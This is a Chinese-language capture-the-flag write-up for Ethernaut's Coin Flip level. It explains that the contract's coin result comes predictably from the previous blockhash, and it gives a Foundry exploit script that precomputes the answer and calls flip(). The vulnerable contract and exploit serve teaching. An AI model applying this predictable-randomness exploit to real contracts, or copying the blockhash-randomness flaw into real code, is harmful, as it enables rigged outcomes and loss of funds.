# Level 3 - Coin Flip
## 題目
[Coin Flip](https://ethernaut.openzeppelin.com/level/0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF)

### 通關條件
這是一個擲銅板的遊戲。你需要連續地猜對擲出來的結果。為了完成這一關，你需要利用你的超能力，然後連續猜對十次。
### 合約內容
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
## 解題
這一題的目標是跟合約玩猜硬幣的遊戲，並且要連續猜對 10 次
所以我們可以嘗試從合約中找到它是怎麼決定這把要出什麼，首先合約中只有一個 function `flip(bool _guess)` 也就是呼叫這個 function 並決定你要猜 true 或是 false，可以從第 24 行看到它是用 `side == _guess` 進行比較，而 `side` 的計算方式在 21 - 22 行決定，決定方式如下：
```solidity=21
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
```
也就是說，這個值不是隨機的。我們只要將一樣的計算方式放入我們的攻擊合約就好。

21 行的 `FACTOR` 可以在第 7 行找到，是常數。`blockValue` 就比較麻煩了，可以在第 14 行中找到，但是它使用到 `block.number` ，所以我們每次猜的時候必須要跟合約在同一個區塊上
但是 16, 20 行又禁止每次猜的時候在同一個區塊。所以這題我們必須寫一個計算它出什麼然後呼叫 `flip()` 的合約，並且呼叫 10 次

>[!Tip]
>`block.number` 是 Solidity 的全域變數，Solidity 的全域變數通常用來儲存與區塊鏈或是交易有關的資訊，其他常見的全域變數可以參考：[[英文] Understanding Solidity Global Variables: Types and Uses](https://metana.io/blog/solidity-global-variables-types-and-uses/)

確認每個變數以及計算方式後，就可以攻破這關了，攻擊合約如下：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/03_CoinFlip.sol";

contract ExploitScript is Script {
    CoinFlip public level03 = CoinFlip(your_challenge_address);
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        vm.startBroadcast();

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        level03.flip(side);

        vm.stopBroadcast();
    }
}
```
接下來只要透過 forge 呼叫 10 次即可。